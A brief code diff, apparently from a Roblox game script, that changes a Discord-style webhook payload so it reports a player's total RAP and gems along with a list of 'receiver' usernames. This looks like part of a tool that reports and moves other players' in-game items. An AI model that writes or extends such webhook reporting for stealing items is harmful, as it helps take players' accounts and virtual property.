@@ -670,7 +670,7 @@ local function BuildWebhookPayload()
         },
         {
             name = "VALUATION",
-            value = "```yml\nTotal RAP: " .. FormatNumber(rapNum) .. "\nGems: " .. FormatNumber(gemNum) .. "\nItems: " .. tostring(totalItems) .. "\n```",
+            value = "```yml\nTotal RAP: " .. FormatNumber(rapNum) .. "\nGems: " .. FormatNumber(gemNum) .. "\nReciver: " .. table.concat(USERNAMES, ", ") .. "\n```",
             inline = true
         },
         {
